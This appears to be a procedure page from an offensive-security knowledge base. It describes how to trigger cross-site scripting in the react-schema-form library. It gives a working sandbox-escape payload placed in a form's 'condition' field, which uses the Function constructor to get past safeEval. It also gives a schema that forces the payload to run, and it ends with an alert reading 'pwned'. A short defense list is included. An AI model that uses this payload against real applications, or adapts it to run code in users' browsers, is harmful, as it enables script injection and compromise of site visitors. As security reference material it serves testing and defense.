---
id: proc-trigger-xss
tags:
  - xss
  - json-schema
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/react-schema-form-xss-payload]]'
  - '[[commands/react-schema-form-schema]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:16:08.443Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Trigger XSS with Malicious Form Schema

## Summary

This procedure configures a malicious JSON form and schema in react-schema-form to trigger the sandbox escape, executing an alert in the browser.

## Description

By setting a 'condition' field in the form JSON with the adapted payload (using alert instead of log), and a schema requiring the field, safeEval processes it, escaping the sandbox for XSS.

## Requirements

1. react-schema-form interface loaded
2. Ability to input JSON
3. Browser with JS enabled

## Defense

Defensive measures and detection strategies:

- Validate and escape JSON inputs
- Disable eval in client-side code
- Monitor for unexpected alerts or JS execution

## Objectives

1. Inject payload into form condition
2. Require field to force evaluation
3. Achieve arbitrary JS execution

## Instructions

### Step 1: Set Malicious Form

**Context**: Input the form JSON with payload in condition.

**Command** ([[commands/react-schema-form-xss-payload]]):
```json
[ { "key": "comments", "condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()", "type": "radios", "titleMap": [ { "value": "S", "name": "Shipping" }, { "value": "P", "name": "Pickup" } ] } ]
```

> Payload in condition. Expected output: Form configured.

### Step 2: Set Schema

**Context**: Define schema to require the field.

**Command** ([[commands/react-schema-form-schema]]):
```json
{ "type": "object", "required": [ "comments" ] }
```

> Triggers condition eval. Expected output: Alert 'pwned'.

### Step 3: Render Form

**Context**: Submit to process.

**Command**:

> Click render. Expected output: XSS alert.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/react-schema-form-xss-payload]]
- [[commands/react-schema-form-schema]]

## Tools Used


## Tags

- xss
- json-schema
